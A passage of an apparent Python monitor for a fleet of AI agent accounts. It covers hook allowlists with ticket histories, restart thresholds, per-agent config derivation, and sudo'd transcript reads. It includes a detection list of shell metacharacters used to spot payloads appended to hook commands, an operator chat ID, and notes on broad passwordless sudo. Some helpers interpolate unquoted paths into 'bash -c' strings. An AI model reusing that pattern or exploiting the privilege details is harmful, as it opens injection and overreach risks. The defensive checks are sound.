        "telegram-reply-gate.py",  # Stop hook — block a telegram-inbound turn ending without the reply tool (T-2188, operator-directed; recovery-first soak 2026-07-28)
        "hook-handler.js",        # agent-monitor (PreToolUse/PostToolUse/Stop/SubagentStop/Notification/SessionStart/SessionEnd)
        "snapshot-settings.sh",   # pre-write settings backup (PreToolUse)
        "handoff-auto-read.sh",   # SessionStart auto-read
        "backlog-surface.sh",     # SessionStart backlog surface
        "adaptive_finish_detect.py",  # SubagentStop finish detection
        "ho_stop_failure.py",     # StopFailure cap-hit resumer trigger
        "mcp-list-guard.py",      # PreToolUse(Bash) guard vs `claude mcp list` while poller live (T-0996/T-1000 deploy 2026-06-12)
        "recall-feedback.py",     # PreToolUse footgun recall hook (T-1090; live-wired orchestrator-first 2026-06-13, operator-approved msg 3850)
        "verify-hook-integrity.sh",  # SessionStart hook content-integrity check vs canonical (T-1284; Miasma persistence-vector defense, automates the T-1244 manual diff)
        "worker-guard.py",        # PreToolUse(Bash) agent_type-gated guard vs off-brief SUBAGENT drift — token-read/raw Bot API/ledger+adr+notes writes, push/PR for implementer+reviewer; HO main-thread untouched (T-1345; live-wired orchestrator-first 2026-06-27 post echo-4c3-impl runaway)
        "ensure-hooks-active.sh",  # SessionStart auto-repair of core.hooksPath (T-1216 option B, the operator 2026-07-01 TG4512; self-heals the 6/09 silent-drift)
        "telegram-reply-gate.py",  # Stop hook: block a turn that answered a Telegram inbound only in the TRANSCRIPT (T-2188, operator-directed via mnemosyne TG 206/211/212). CURATED, not auto-derived: read the file before adding — fail-open on every error path, bounded to ONE block per inbound (sha1 marker, 10-min prune) so an agent that genuinely cannot reply still ends its turn, and tail-reads the transcript (38MB measured) rather than parsing it whole. This is the STRUCTURAL form of the rule pinned at the top of CLAUDE.md, which is the highest-failure-rate rule I carry and has been the dominant lapse across HO sessions — its own docstring says it: "A pin is a reminder; this is a mechanism."
        "background-pipe-gate.py",  # T-2313, allowlist-FIRST. ORCHESTRATOR WAS THE GAP, and the ticket as filed said otherwise: the Ask asserted "orchestrator + recovery carry this guard already (T-1907)" and recovery MEASURED orchestrator at ZERO refs across settings.json, settings.local.json and the project-level surface, re-verified independently here. What made it easy to read past: this seat has five other PreToolUse hooks registered and working, so the failure is not "hooks are broken here". The wrong belief came from recovery's own allowlist entry above reading "recovery-first soak" — an allowlist records that a hook is PERMITTED, not that any seat RUNS it, and reading it as coverage is the presence-vs-activation conflation T-2261 and T-2312 both landed on this same week. Widened to every seat but recovery on recovery's argument, accepted: long-suite-backgrounded-through-a-pipe is the orchestrator's normal working mode, and a false green here propagates further than a false green on a worker, because the rest of the fleet acts on this seat's readings.
    },
    "specialist": {
        "telegram-reply-gate.py",  # Stop hook — block a telegram-inbound turn ending without the reply tool (T-2188, operator-directed; recovery-first soak 2026-07-28)
        "handoff-auto-read.sh",   # SessionStart auto-read
        "mcp-list-guard.py",      # PreToolUse(Bash) guard vs `claude mcp list` while poller live (T-0996/T-1000 deploy 2026-06-12)
        "verify-hook-integrity.sh",  # SessionStart hook content-integrity check vs canonical (T-1286/T-1284 fleet rollout; Miasma persistence-vector defense)
        "ensure-hooks-active.sh",  # SessionStart auto-repair of core.hooksPath (T-1216 option B, the operator 2026-07-01 TG4512; self-heals the 6/09 silent-drift)
        "background-pipe-gate.py",  # T-2313, allowlist-FIRST. Fleet-wide pass; specialist runs long research/watch suites backgrounded.
    },
    # T-1945: EMPTY allowlists are the strictest posture, not a no-op — these
    # personas were inventoried 2026-07-21 with ZERO hooks configured in
    # ~/.claude/settings.json, so ANY hook that ever appears is a deviation
    # alert. Do not "seed" these with entries preemptively; add a basename only
    # when a hook is deliberately installed on that account.
    "mnemosyne": {
        # ORG-042 second head; had NO hooks at bringup (verified 2026-07-21) until T-2188.
        "telegram-reply-gate.py",  # Stop hook — block a telegram-inbound turn ending without the reply tool (T-2188, operator-directed; recovery-first soak 2026-07-28)
        # ALLOWLIST-FIRST, per the T-1947 bounded-exception ordering documented in the atlas
        # block below: the install is PENDING (the fleet handoff-auto-read rollout is standing
        # instruction; mnemosyne's seat acts on it at its next natural session cycle), and a
        # fresh install must not race Recovery's drift check in the gap. Landing the basename first
        # makes that window zero AND avoids the third failure this ordering exists to prevent,
        # measured on metis 2026-07-28: settings.json-registered but not-allowlisted BLOCKS
        # EVERY COMMIT from the seat via the T-1102 pre-commit pairing guard, and the seat
        # cannot self-unblock because the fix lives in this file on PR-only main. If you are
        # reading this and mnemosyne's settings.json still has no handoff-auto-read entry, the
        # install half has not happened yet — that is the expected transient, not drift.
        "handoff-auto-read.sh",   # SessionStart org-content injection (fleet rollout; allowlist-first 2026-07-28, install pending)
        "background-pipe-gate.py",  # T-2313, allowlist-FIRST. mnemosyne is a pure-ACP seat but runs the same backgrounded-suite workload; included in the fleet-wide pass rather than deferred, since the hazard is workload-shaped, not architecture-shaped.
    },
    "metis": {
        # T-1937(a): FIRST hook deliberately installed on a seat. suborch1's
        # settings.json had zero hooks, which is exactly why core.hooksPath was
        # found UNSET on this clone 2026-07-21 while atlas's was armed — the
        # SessionStart self-heal had never been wired here. Added per the
        # rule above (a basename lands only when the hook is actually
        # installed), not seeded preemptively.
        "ensure-hooks-active.sh",  # SessionStart auto-repair of core.hooksPath (T-1216 option B)
        "handoff-auto-read.sh",   # SessionStart org-content injection. Deployed 2026-07-28 23:12Z by the metis seat ITSELF, acting on orchestrator's fleet-rollout mailbox instruction (message verified consumed from metis/cur). Verified byte-identical to repo canonical (sha256 c5927258) and wired in the canonical shape before allowlisting — the T-0536 alert on it was the pairing gap, not an injection.
        "background-pipe-gate.py",  # T-2313, allowlist-FIRST. metis runs the same workload class as atlas — long suites, backgrounded, piped — and hit the hazard the same night.
    },
    "atlas": {
        # T-1947. NOTE THE ORDERING, and that it is a deliberate, bounded exception to the
        # "never seed preemptively" rule above — do not copy this pattern without reading why.
        #
        # As of THIS commit the hook is NOT yet installed on suborch2: settings.json has no
        # `hooks` key at all (245 bytes, first-hand verified 2026-07-22 — the T-1947 Ask
        # asserted the opposite and was wrong). The allowlist entry lands FIRST, deliberately,
        # because atlas's install is a FRESH one: if the hook appeared before its basename was
        # allowlisted, Recovery's 5-min drift check would flag it as a deviation in the gap. Landing
        # the entry first makes that window zero. Metis's T-1937 "allowlist WITH the install in
        # one push" ordering applied to a hook that was ALREADY installed; the inverse case
        # needs the inverse sequence (HO ruling, T-1947).
        #
        # The exception is bounded and closes immediately: the settings.json install follows
        # right after this merges. RESOLVED 2026-07-28: the second half of T-1947 happened —
        # ensure-hooks-active.sh was installed on suborch2 (deploy verified by metis's T-2261
        # investigation the same night).
        #
        # Why atlas needs it at all, corrected from the Ask: atlas's core.hooksPath IS armed and
        # works, but with no SessionStart self-heal nothing re-arms it if it drifts. Mirror image
        # of metis (hers were unset-then-protected; atlas's are working-but-unprotected).
        "ensure-hooks-active.sh",  # SessionStart auto-repair of core.hooksPath (T-1216 option B)
        "handoff-auto-read.sh",   # SessionStart org-content injection. Installed 2026-07-28 ~23:37Z by the atlas seat itself (fleet rollout; settings.json edit approved by orchestrator via tmux, this-edit-only). Entry lands same-night so the T-1102 pairing guard does not block the seat's commits — the metis-measured failure mode this ordering prevents.
        "background-pipe-gate.py",  # T-2313, allowlist-FIRST. atlas is the MOTIVATING seat: 2026-07-29 ~05:4xZ during T-2281 a full-sweep pytest backgrounded through `| tail -4` reported EXIT CODE 0 to the harness while pytest had reported `1 failed` — tail's status, not pytest's. Caught only because the output file looked empty and atlas went and read it.
    },
}
# Re-alert at most once per this window per agent (deviation persists until a
# human acts; don't spam every 5-min cycle).
HOOK_ALERT_THROTTLE_SECONDS = 6 * 60 * 60
# Per T-0584 Layer 3: alert via Telegram after this many consecutive
# fire_restart failures per agent. Reset on first success. Default 3
# (~15 min of silent failure at the 5-min monitor cadence) — would have
# surfaced the 2026-05-25 wedged-flock incident within ~15 min instead
# of relying on the operator noticing 3.5 days later.
RESTART_FAILURE_ALERT_THRESHOLD = int(os.environ.get("RESTART_FAILURE_ALERT_THRESHOLD", "3"))
# Script-like token extensions used to identify the program a hook runs.
_HOOK_SCRIPT_EXTS = (".sh", ".js", ".mjs", ".ts", ".py", ".rb", ".bash")
# Shell metacharacters that never appear in a legitimate hook command and that
# would let an attacker append a payload to an allowlisted token (command
# substitution, pipes, redirects, background, subshells). Their presence ⇒ the
# command is a deviation regardless of which scripts it names.
_HOOK_SHELL_METACHARS = (";", "|", "&", "`", "$", ">", "<", "(", ")", "{", "}", "\\", "\n", "\r")

# Recovery's own Telegram bridge token + the org chat (the operator). Used only by the
# DEFENSIVE fallback path; the primary alert routes to Recovery's pane via
# inbox_consumer._send_alert_via_recovery (see maybe_alert_hook_deviation).
TELEGRAM_ENV = Path.home() / ".claude" / "channels" / "telegram" / ".env"
OPERATOR_CHAT_ID = "456474197"


# ---------------------------------------------------------------------------
# Per-agent configuration
# ---------------------------------------------------------------------------
#
# Each entry tells the monitor: where to read the jsonl, who to sudo-as for
# the read, which systemd unit owns the agent's tmux session, what tmux
# target the restart wrapper writes into, and whether the unit is a user
# or system unit. New agents land as a single dict entry.
#
# Recovery (claude-fallback) uses a tombstone-write path instead of direct restart.
# Rationale: the monitor runs on Recovery's account; Recovery cannot fire its own
# systemctl restart from within the running process without risking a race where
# SIGTERM arrives before the restart completes. Instead, Recovery writes a tombstone
# at RECOVERY_TOMBSTONE_PATH; the separate pantheon-restart-drain timer (a different
# systemd unit, running concurrently on Recovery's account) picks up the tombstone
# and fires handoff_and_restart.sh. The drain unit is NOT the unit being restarted,
# so the drain completes before the restart terminates it. Per ORG-020 Phase 1.
#
# Orchestrator and Specialist use the direct-restart path (fire_restart) unchanged — the
# monitor runs on Recovery's account and sudo's into their accounts, so the restart
# doesn't kill the monitor process itself.

# ---------------------------------------------------------------------------
# AGENT_CONFIG — built from instance.yaml (T-2076), not a hardcoded dict.
#
# Portable identity (account, the account-derived jsonl/handoff/restart_bin/
# supervise paths, and restart service+mode+pane) comes from instance.yaml via
# agent_role_map.instance_binding(); a self-hoster configures accounts + services
# ONCE there instead of editing this file. _MONITOR_TUNING below holds only the
# monitor-side tuning instance.yaml can't know, keyed by persona.
#
# Derivation rules (account-single-sourced):
#   sudo_user      = <account>
#   jsonl_dir      = /home/<account>/.claude/projects/-home-<account>
#   handoff_file   = /home/<account>/HANDOFF.md                         (agents with restart config)
#   restart_bin    = /home/<account>/pantheon-config/tools/handoff_and_restart.sh
#                                                                       (fire-path: restart config AND not observation-only)
#   supervise_script = /home/<account>/.local/bin/<supervise_script_name>
#   restart_service / restart_mode / restart_target_pane  <- instance.yaml (restart_service/restart_mode/restart_pane)
#
# PROVABLY equivalent to the former hardcoded literals for the reference instance:
# test_context_fill_monitor.TestBuildAgentConfig asserts built == a frozen snapshot
# of those literals, so this refactor is a verified no-op for the live fleet.
# ---------------------------------------------------------------------------
_MONITOR_TUNING: dict[str, dict] = {
    # Fire-path agents (direct/tombstone restart). model_pin is HOST-LOCAL (the
    # declared fleet supervise --model pin) — deliberately NOT in instance.yaml.
    #
    # model_pin is the fleet's single DECLARED --model record for each fire-path
    # agent. It has no production consumer today: the auto-stepper that used to
    # read it as `expect_from` (tools/model_stepper.py) was removed in T-2737
    # (2026-08-10), retiring the cap-pressure step-down policy fleet-wide in
    # favor of a flat opus-4-8 standard. model_pin's job now is purely
    # declarative and CI-guarded: TestBuildAgentConfig snapshots it, and
    # TestModelPinMatchesSuperviseScripts (T-2791) asserts each value against
    # the actual --model token in tools/systemd/<supervise_script_name>, so a
    # fleet model change that isn't mirrored here fails CI instead of drifting
    # silently — the exact failure mode T-2134 originally diagnosed.
    #
    # History: the operator ruled 2026-07-28 that no cap-pressure ladder is needed
    # and the fleet stays on its current model (T-2136); that ruling stands
    # even though the mechanism it governed (the stepper) is gone.
    "orchestrator": {
        "context_window": DEFAULT_CONTEXT_WINDOW_TOKENS,
        "supervise_script_name": "claude-bot-supervise.sh",
        "model_pin": "claude-opus-4-8",
    },
    "specialist": {
        "context_window": DEFAULT_CONTEXT_WINDOW_TOKENS,
        "supervise_script_name": "specialist-bot-supervise.sh",
        "model_pin": "claude-opus-4-8",
    },
    "recovery": {
        # Recovery uses tombstone-write (use_tombstone) not direct restart, and gets the
        # durable supervisor-pin edit only (RECOVERY-SELF: no live self-inject per T-0559,
        # no auto-restart — Recovery is the backstop). No explicit context_window (falls to
        # the resolve() default — the one fire-path agent without the key, preserved).
        "supervise_script_name": "recovery-bot-supervise.sh",
        "model_pin": "claude-opus-4-8",
        "use_tombstone": True,
    },
    # OBSERVATION-ONLY (mnemosyne ORG-042; metis/atlas ORG-043 seats). Read-only
    # consumers (channel-liveness, credential-expiry, hook-drift via recovery's cycle)
    # key on these; there is deliberately NO context-fill auto-restart (no @agent
    # timer, remediate=False), so no restart_bin is derived (observation_only
    # suppresses it) even where a restart_service/pane is recorded (mnemosyne).
    "mnemosyne": {
        "context_window": DEFAULT_CONTEXT_WINDOW_TOKENS,
        "observation_only": True,
        "remediate": False,
        "hook_check_via_recovery": True,
    },
    "metis": {"observation_only": True, "remediate": False, "hook_check_via_recovery": True},
    "atlas": {"observation_only": True, "remediate": False, "hook_check_via_recovery": True},
}


def _build_agent_config() -> dict[str, dict]:
    """Build AGENT_CONFIG from instance.yaml bindings + _MONITOR_TUNING (T-2076).

    See the block comment above for the derivation rules. A persona with no
    instance.yaml binding (a manifest-less env not covered by the agent_role_map
    fallback) is skipped — --validate + the runtime account check surface a
    genuinely-absent agent rather than the monitor silently half-building one."""
    cfg: dict[str, dict] = {}
    for persona, tuning in _MONITOR_TUNING.items():
        binding = _instance_binding(persona)
        account = binding.get("account")
        if not account:
            continue
        tuning = dict(tuning)
        observation_only = bool(tuning.get("observation_only"))
        has_restart = "restart_service" in binding
        # T-2682: control-plane-supervised seats (recovery, specialist, future consume
        # seats) launch cwd=<account>/pantheon-config via the persona-consume
        # runtime scope, so Claude Code slugifies their LIVE-session project dir
        # to -home-<account>-pantheon-config -- NOT the plain -home-<account> a
        # bespoke-supervised (home-cwd) seat uses. cfm must watch the dir the
        # live session actually writes to, or its context-fill % reads a stale/
        # other project dir and never fires (the exact recovery blind-spot: 2-day
        # marathon, zero auto-restarts). Mirrors the restart_service
        # control-plane branch below (T-2658).
        supervisor = binding.get("supervisor")
        project_slug = (
            f"-home-{account}-pantheon-config"
            if supervisor == "control-plane"
            else f"-home-{account}"
        )
        entry: dict = {
            "sudo_user": account,
            "jsonl_dir": Path(f"/home/{account}/.claude/projects/{project_slug}"),
        }
        if has_restart:
            entry["handoff_file"] = f"/home/{account}/HANDOFF.md"
        if has_restart and not observation_only:
            entry["restart_bin"] = f"/home/{account}/pantheon-config/tools/handoff_and_restart.sh"
        if has_restart:
            entry["restart_service"] = binding["restart_service"]
            # restart_mode defaults to 'user' (T-2076 review #1): a fork that sets
            # restart_service but omits restart_mode must not pass --validate then
            # KeyError at fire time in _build_restart_argv. Keeps cfm symmetric with
            # restart_drain (which already defaults it). restart_target_pane stays
            # gated on presence so a missing pane fails --validate (a required field)
            # loudly rather than send-keys'ing at a None pane.
            entry["restart_mode"] = binding.get("restart_mode", "user")
            if "restart_pane" in binding:
                entry["restart_target_pane"] = binding["restart_pane"]
            # T-2658: control-plane-supervised seats (specialist, T-2633 cutover)
            # restart via the derived pantheon-persona-consume@<persona> unit,
            # not the (disabled) bespoke restart_service above -- this is the
            # exact live landmine: context_fill_monitor's own cap-hit
            # auto-restart fires handoff_and_restart.sh via build_restart_argv
            # below, independently of restart_drain.py's tombstone path.
            if supervisor == "control-plane":
                entry["restart_service"] = _control_plane_consume_service(persona)
                entry["supervisor"] = "control-plane"
        name = tuning.pop("supervise_script_name", None)
        if name:
            entry["supervise_script"] = f"/home/{account}/.local/bin/{name}"
        entry.update(tuning)
        cfg[persona] = entry
    return cfg


AGENT_CONFIG: dict[str, dict] = _build_agent_config()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _log(agent: str, msg: str) -> None:
    """Emit a structured log line to stdout (captured by systemd journal)."""
    ts = int(time.time())
    print(f"[context_fill_monitor agent={agent} ts={ts}] {msg}", flush=True)


def _state_path_for_agent(agent: str) -> Path:
    """Return the per-agent last-restart state file path."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_last_restart.json"


def _last_fire_path_for_agent(agent: str) -> Path:
    """Return the per-agent last-FIRE state file (T-1330 dead-transcript guard source).

    SEPARATE from last_restart (which is success-only and drives cooldown). This file
    is written UNCONDITIONALLY at fire time — before fire_restart's success/failure is
    known — because the act of firing handoff_and_restart issues the service restart
    that freezes the transcript, regardless of whether the post-restart steady-state
    VERIFICATION later passes. Keying the dead-transcript guard off success-only state
    (the original T-1328 bug) misses a restart recorded as 'failed' that nonetheless
    restarted the service (e.g. a fresh session that booted slower than the 60s
    steady-state window), leaving the now-frozen transcript unguarded.
    """
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_last_fire.json"


def write_last_fire_state(path: Path, agent: str, jsonl_path: Path, jsonl_mtime: float | None) -> None:
    """Record the transcript a restart was just fired against (+ its fire-time mtime),
    unconditionally at fire time. Drives the T-1330 dead-transcript guard. Fail-soft:
    a write error must never break the fire path (best-effort guard state)."""
    data = {
        "ts": int(time.time()),
        "agent": agent,
        "jsonl_path": str(jsonl_path),
        "jsonl_mtime": jsonl_mtime,
    }
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(data) + "\n", encoding="utf-8")
    except OSError as exc:
        _log(agent, f"write_last_fire_state: {exc!r} (non-fatal)")


def _projects_dir_for_agent(agent: str, cfg: dict) -> Path:
    """Return the agent's jsonl directory, honouring CONTEXT_FILL_PROJECTS_DIR_<AGENT>."""
    env_key = f"CONTEXT_FILL_PROJECTS_DIR_{agent.upper()}"
    env_val = os.environ.get(env_key)
    return Path(env_val) if env_val else cfg["jsonl_dir"]


def resolve_context_window(cfg: dict) -> int:
    """Advertised context window (tokens) for an agent. T-1289.

    Resolution precedence:
      1. ``PANTHEON_CONTEXT_WINDOW`` env — global override (used by tests).
      2. ``cfg["context_window"]`` — the agent's AGENT_CONFIG entry. SET THIS to
         the agent's real window whenever it runs a non-1M-window model (e.g.
         Haiku 4.5 = 200_000). The monitor is instantiated per-agent
         (``pantheon-context-fill-monitor@<agent>``), and a single env var cannot
         differ per instance, so AGENT_CONFIG is the only working per-agent
         channel. Without a correct per-agent window, a small-window agent could
         NEVER reach ``threshold × 1M`` (it hits its hard context limit first), so
         the graceful restart would never fire.
      3. ``DEFAULT_CONTEXT_WINDOW_TOKENS`` — 1M Opus-class default.
    """
    env = os.environ.get("PANTHEON_CONTEXT_WINDOW")
    if env is not None:
        return int(env)
    return int(cfg.get("context_window", DEFAULT_CONTEXT_WINDOW_TOKENS))


def resolve_base_threshold_fraction(window_tokens: int, cfg: dict | None = None) -> float:
    """Base restart-trigger FRACTION for an agent's window (T-1497 part B).

    Encodes trigger_tokens = min(absolute degradation onset, safety-cap ×
    window), returned as a fraction of the window so all downstream plumbing
    (fill_pct comparison, effective_fill_threshold, notify strings) stays in
    fraction space. See the constants block for the bases.

    Precedence:
      1. ``CONTEXT_FILL_THRESHOLD`` env (LEGACY, the operator's msg-2360 knob) — an
         explicit operator fraction that BYPASSES the min() entirely.
      2. ``cfg["restart_absolute_tokens"]`` — per-agent absolute calibration
         (REQUIRED below SMALL_WINDOW_CALIBRATION_FLOOR_TOKENS, enforced by
         --validate); replaces the global absolute term.
      3. ``CONTEXT_FILL_RESTART_ABSOLUTE_TOKENS`` / ``CONTEXT_FILL_SAFETY_CAP_FRACTION``
         env overrides, else the module constants.

    A non-positive window (degenerate PANTHEON_CONTEXT_WINDOW) returns the cap
    fraction — harmless: main() already forces fill_pct to 0.0 for it.
    """
    legacy = os.environ.get("CONTEXT_FILL_THRESHOLD")
    if legacy is not None:
        return float(legacy)
    cap = float(
        os.environ.get("CONTEXT_FILL_SAFETY_CAP_FRACTION", CONTEXT_FILL_SAFETY_CAP_FRACTION)
    )
    if window_tokens <= 0:
        return cap
    abs_tokens = int(
        (cfg or {}).get(
            "restart_absolute_tokens",
            os.environ.get(
                "CONTEXT_FILL_RESTART_ABSOLUTE_TOKENS", CONTEXT_FILL_RESTART_ABSOLUTE_TOKENS
            ),
        )
    )
    return min(abs_tokens / window_tokens, cap)


def _current_user() -> str:
    """Return this process's account through a module-local test seam.

    Tests must patch this wrapper, not ``getpass.getuser`` on the imported
    module object.  The latter is a process-wide singleton shared by every
    module that imports getpass, so patching it there silently changes any
    other module's sudo decision too.
    """
    return getpass.getuser()


def _sudo_prefix(sudo_user: str) -> list[str]:
    """Return argv prefix for sudo'ing as the agent's account.

    No sudo when the target is our OWN account: sudo-to-self is unnecessary and
    is not granted (you don't sudo to yourself). NOTE (corrected 2026-07-27,
    T-2029): Recovery's sudoers is now NOPASSWD:ALL to EVERY pantheon account
    (claude, claude-research, exocortex, suborch1, suborch2, codex,
    the-ancestor) — not the old narrow claude/claude-research-only grant a
    prior version of this comment claimed. Verify with `sudo -n -l` rather than
    trusting a comment. Recovery monitoring itself reads its own jsonl directly —
    per the AGENT_CONFIG note
    "Recovery reads its own JSONL (no sudo needed — same account)". Without this,
    Recovery's self-monitor silently fails every read and never detects its own fill.
    """
    if sudo_user == _current_user():
        return []
    return ["sudo", "-nu", sudo_user]


def find_latest_jsonl(projects_dir: Path, sudo_user: str, agent: str) -> Path | None:
    """Return Path to the most-recently-modified jsonl in projects_dir.

    Uses sudo'd `find` since projects_dir is on the agent's account (700-mode).
    Returns None on any failure (no jsonl, sudo denied, etc.) — fail-open per
    the bail-and-poll design.
    """
    cmd = _sudo_prefix(sudo_user) + [
        "bash",
        "-c",
        f"find {projects_dir} -maxdepth 1 -name '*.jsonl' -printf '%T@ %p\\n' 2>/dev/null",
    ]
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=JSONL_PROBE_TIMEOUT_SECONDS,
        )
    except (subprocess.TimeoutExpired, OSError) as exc:
        _log(agent, f"find_latest_jsonl: subprocess error {exc!r}")
        return None
    if result.returncode != 0:
        _log(agent, f"find_latest_jsonl: rc={result.returncode} stderr={result.stderr.strip()}")
        return None
    lines = [line for line in result.stdout.strip().split("\n") if line]
    if not lines:
        return None
    lines.sort(reverse=True)
    try:
        return Path(lines[0].split(" ", 1)[1])
    except IndexError:
        return None


def _jsonl_mtime(jsonl_path: Path, sudo_user: str, agent: str) -> float | None:
    """Return jsonl_path's mtime (epoch seconds) via a sudo'd stat.

    Returns None on any failure (no file, sudo denied, unparseable) — callers MUST
    treat None as 'unknown', never as 'dead' (fail-open, mirrors find_latest_jsonl).
    """
    cmd = _sudo_prefix(sudo_user) + [
        "bash",
        "-c",
        f"stat -c %Y {jsonl_path} 2>/dev/null",
    ]
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=JSONL_PROBE_TIMEOUT_SECONDS,
        )
    except (subprocess.TimeoutExpired, OSError) as exc:
        _log(agent, f"_jsonl_mtime: subprocess error {exc!r}")
        return None
    out = result.stdout.strip()
    if result.returncode != 0 or not out:
        return None
    try:
        return float(out)
    except ValueError:
        return None


def projects_dir_exists(projects_dir: Path, sudo_user: str, agent: str) -> bool | None:
    """T-0824 part 2: probe whether projects_dir exists (account-aware `test -d`).

    Distinguishes a MISCONFIGURED jsonl path (dir absent → the monitor can never
    detect fill: a total silent failure of the recovery layer) from a FRESH
    agent with no sessions yet (dir present but empty → benign). Uses the same
    sudo'd `bash -c` shape as find_latest_jsonl so a sudo failure (rc != 0) is
    disambiguated from a definitive present/absent answer (read off stdout).

    Returns True if the dir exists, False if it provably does not, None if the
    probe itself was inconclusive (sudo denied, subprocess error) — the caller
    must NOT claim misconfig on an inconclusive probe (fail-safe, no false alert).
    """
    cmd = _sudo_prefix(sudo_user) + [
        "bash",
        "-c",
        f"test -d {projects_dir} && echo EXISTS || echo MISSING",
    ]
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=JSONL_PROBE_TIMEOUT_SECONDS,
        )
    except (subprocess.TimeoutExpired, OSError) as exc:
        _log(agent, f"projects_dir_exists: subprocess error {exc!r}")
        return None
    if result.returncode != 0:
        _log(agent, f"projects_dir_exists: inconclusive rc={result.returncode} "
                    f"stderr={result.stderr.strip()}")
        return None
    out = result.stdout.strip()
    if out == "EXISTS":
        return True
    if out == "MISSING":
        return False
    _log(agent, f"projects_dir_exists: inconclusive stdout={out!r}")
    return None


def account_exists(account: str) -> bool:
    """T-2071: is `account` a real Unix account on this box?

    THE seeder footgun this closes: a self-hoster who leaves the reference-instance
    account defaults (claude / claude-research / claude-fallback / …) in AGENT_CONFIG
    on a box where those accounts do NOT exist gets a monitor that SILENTLY watches
    nothing — because the `sudo -u <missing-account>` path probe fails INCONCLUSIVE
    (rc != 0), which projects_dir_exists() correctly returns as None, which the
    caller correctly treats as fail-safe/benign. So "account absent" hides behind
    "probe inconclusive" and never alerts. Account existence is the axis that tells
    them apart — and unlike 700-mode path checks it reads off the GLOBALLY-visible
    passwd DB, so it is checkable for EVERY agent regardless of which account runs
    the monitor. KeyError (the account is genuinely absent) is the definitive-absence
    signal this check exists to surface; any OTHER exception fails OPEN (returns True)
    so a passwd-DB error never false-alarms. NB: on a networked NSS backend (LDAP/
    NIS/SSSD) a transient outage can surface as KeyError for a real account — a
    non-issue for the reference fleet (local /etc/passwd, deterministic), noted for
    self-hosters on networked NSS.
    """
    try:
        pwd.getpwnam(account)
        return True
    except KeyError:
        return False
    except Exception as exc:  # pragma: no cover - passwd DB pathology
        _log("account_exists", f"({account!r}): unexpected {exc!r}; fail-open")
        return True


def read_latest_usage(jsonl_path: Path, sudo_user: str, agent: str) -> dict | None:
    """Read the most-recent `usage` event from the jsonl via sudo'd tac.

    Each jsonl line is a self-contained JSON object. `usage` lives at
    `message.usage` for assistant-message events (and may also appear at
    top-level on some event types). We tac the file, parse each line as
    JSON, and return the first usage dict we find — i.e. the most recent
    one written.

    Returns the parsed `usage` dict or None on any failure (no usage event
    in the last N lines, malformed JSON, etc.).
    """
    cmd = _sudo_prefix(sudo_user) + [
        "bash",
        "-c",
        f"tac {jsonl_path} | head -n 200",
    ]
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=JSONL_PROBE_TIMEOUT_SECONDS,
        )
    except (subprocess.TimeoutExpired, OSError) as exc:
        _log(agent, f"read_latest_usage: subprocess error {exc!r}")
        return None
    if result.returncode != 0:
        _log(agent, f"read_latest_usage: rc={result.returncode} stderr={result.stderr.strip()}")
        return None
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except (json.JSONDecodeError, ValueError):
            continue
        if not isinstance(obj, dict):
            continue
        msg = obj.get("message")
        if isinstance(msg, dict):
            usage = msg.get("usage")
            if isinstance(usage, dict):
                return usage
        usage = obj.get("usage")
        if isinstance(usage, dict):
            return usage
    return None


def read_recent_records(
    jsonl_path: Path, sudo_user: str, agent: str, limit: int = API_HEALTH_TAIL_LINES
) -> list[dict]:
    """Return up to `limit` most-recent jsonl records as parsed dicts, newest-first.

    Mirrors read_latest_usage's sudo'd `tac | head` read but returns the full
    parsed records (not just usage) so the API-health check can inspect type,
    isApiErrorMessage, apiErrorStatus, and timestamp. `tac | head -n N` yields
    the last N lines of the file in newest-first order. Unparseable / non-dict
    lines are skipped. Returns [] on any subprocess failure (fail-open per the
    bail-and-poll design).
    """
    cmd = _sudo_prefix(sudo_user) + [
        "bash",
        "-c",
        f"tac {jsonl_path} | head -n {limit}",
    ]
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=JSONL_PROBE_TIMEOUT_SECONDS,
        )
    except (subprocess.TimeoutExpired, OSError) as exc:
        _log(agent, f"read_recent_records: subprocess error {exc!r}")
        return []
    if result.returncode != 0:
        _log(agent, f"read_recent_records: rc={result.returncode} stderr={result.stderr.strip()}")
        return []
    records: list[dict] = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except (json.JSONDecodeError, ValueError):
            continue
        if isinstance(obj, dict):
            records.append(obj)
    return records


def _parse_iso8601_to_epoch(ts) -> float | None:
    """Parse an ISO-8601 timestamp (e.g. '2026-05-21T02:16:29.688Z') to epoch seconds; None on failure."""
    if not isinstance(ts, str):
        return None
    try:
        # datetime.fromisoformat doesn't accept the trailing 'Z' until 3.11;
        # normalise it to an explicit UTC offset to stay version-portable.
        return datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp()
    except (ValueError, TypeError):
        return None


def _coerce_status(val) -> int | None:
    """Coerce an apiErrorStatus value (int or numeric str) to int; None if not numeric."""
    try:
        return int(val)
    except (TypeError, ValueError):
        return None


def _classify_api_record(rec: dict, force_statuses) -> str:
    """Classify a jsonl record for API-health run detection.

    Returns:
      'force_error' — an assistant API-error record with a force-worthy status
                      (a fresh session would clear it).
      'breaker'     — a successful assistant response, OR an API error with a
                      non-force / unknown status (e.g. 529/429/5xx). Either ends
                      the leading error run: a success means the session CAN
                      respond; an upstream error won't be fixed by a restart.
      'skip'        — user / system / metadata records (permission-mode,
                      ai-title, last-prompt, summary, …): they neither extend
                      nor break the run.
    """
    if not isinstance(rec, dict) or rec.get("type") != "assistant":
        return "skip"
    # ⚠️ T-2298: MAIN-LOOP HEALTH AND SUBAGENT HEALTH ARE INDEPENDENT, and
